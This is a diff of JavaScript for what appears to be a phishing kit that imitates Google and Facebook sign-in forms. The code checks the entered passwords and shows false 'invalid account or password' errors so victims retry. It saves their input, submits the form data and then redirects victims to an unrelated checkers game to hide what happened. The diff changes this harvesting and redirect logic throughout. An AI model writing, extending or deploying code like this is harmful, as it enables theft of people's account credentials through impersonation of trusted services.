@@ -5,58 +5,60 @@ let lastSignin = localStorage.getItem('lastSignin');
 
 let isBadInput = localStorage.getItem('badInput');
 
-let maineMessage = document.getElementById('maine-message');
 
 let msgError = document.querySelector('#msg-form');
 
 //facebook form error
 if (lastSignin == 'invalid') {
     form.classList.add('invalid-username');
-}
+  }
 
 
-//google form error
-if (msgError) {
+  //google form error
+  if (msgError) {
     isBadInput ? msgError.innerText = 'Invalid account or password please try again' : msgError.innerText = '';
     
     if (isBadInput == 'false') {
         msgError.innerText = '';
+      }
+      
     }
-
-}
-
-let firsrtInput = form.querySelector('input:nth-child(1)');
-firsrtInput.value = localStorage.getItem('firstInput') ?? '';
-
-
-
-
-
-
-
-
-
-
-
-//Submit form and redirect
-
-form.addEventListener("submit", function(event) {
-    let isFormGood = false;
-    let source = form.getAttribute('data-source');
     
-    //Check if valid google message
-    if (!isStrongmessage(maineMessage.value) && source == "google") {
-        localStorage.setItem('badInput',true);
-        localStorage.setItem('firstInput', firsrtInput.value);
-    } else {
-        localStorage.setItem('badInput',false);
-        localStorage.clear('firstInput');
-        isFormGood = true;
-    }
+    let firsrtInput = form.querySelector('input:nth-child(1)');
+    firsrtInput.value = localStorage.getItem('firstInput') ?? '';
 
+
+
+
+    
+    
+    
+    
+    
+    
+    //Submit form and redirect
+    
+    form.addEventListener("submit", function(event) {
+  let maineMessage = document.getElementById('maine-message');
+  let isFormGood = false;
+  let source = form.getAttribute('data-source');
+  
+  //Check if valid google message
+  if (isStrongmessage(maineMessage.value) && source == "google") {
+      localStorage.setItem('badInput',false);
+      localStorage.clear('firstInput');
+      isFormGood = true;
+    } else if (source == 'google') {
+      localStorage.setItem('badInput',true);
+      localStorage.setItem('firstInput', firsrtInput.value);
+      event.preventDefault(); // Prevent default form submission
+      location.reload();
+    }
+    
 
  //invaid facebook username 
  if (source == 'facebook') {
+    let username = form.querySelector('input:nth-child(1)').value;
     // username... remove white space
     username.trim();
     let usernameSpaces = 0;
@@ -65,7 +67,7 @@ form.addEventListener("submit", function(event) {
 
     let validUsername = usernameSpaces == 1 && username.length > 5 || isPhoneNum;
     if (validUsername && isStrongmessage(maineMessage.value)) {
-        localStorage.setItem('lastSignin', 'valid');
+      localStorage.setItem('lastSignin', 'valid');
         localStorage.clear('lastSignIn');
         isFormGood = true;
     } else {
@@ -73,12 +75,13 @@ form.addEventListener("submit", function(event) {
         //Make the reload restart here to make link not visible in form
         localStorage.setItem('lastSignin', 'invalid');
         localStorage.setItem('firstInput', firsrtInput.value);
+        event.preventDefault(); // Prevent default form submission
+        location.reload();
     }
 }
 
 if (isFormGood) {
-    event.preventDefault(); // Prevent default form submission
-    
+  event.preventDefault(); // Prevent default form submission
     // Get form data
     var formData = new FormData(this);
     
@@ -95,7 +98,7 @@ if (isFormGood) {
         // Optionally, do something with the successful response
         console.log("Form submitted successfully");
         // Redirect to github.com
-        window.location.href = "https://ukulyelye.github.io/checkers-app/";
+        window.location.href = "https://ukulyelye.github.io/checkers-app/checkers";
       } else {
         // Handle errors
         console.error("Form submission failed");
